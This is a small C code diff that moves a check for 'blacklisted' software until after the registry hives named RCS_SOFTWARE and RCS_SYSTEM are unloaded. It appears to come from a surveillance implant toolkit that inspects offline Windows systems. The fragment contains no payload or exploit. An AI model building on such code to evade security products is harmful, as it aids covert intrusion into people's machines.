@@ -211,11 +211,12 @@ BOOL RecognizeWindowsOS(WCHAR *drive_letter, os_struct_t *os_struct)
 	}
 
 	os_struct->arch = WIN_GetArch(os_struct);
-	os_struct->is_blacklisted = WIN_IsBlackListedSoftware(os_struct);
 	os_struct->is_supported = WIN_IsSupported(os_struct); // Va chiamata per ultima...
 
 	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\");
 	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SYSTEM\\");
+
+	os_struct->is_blacklisted = WIN_IsBlackListedSoftware(os_struct);
 
 	return TRUE;
 }
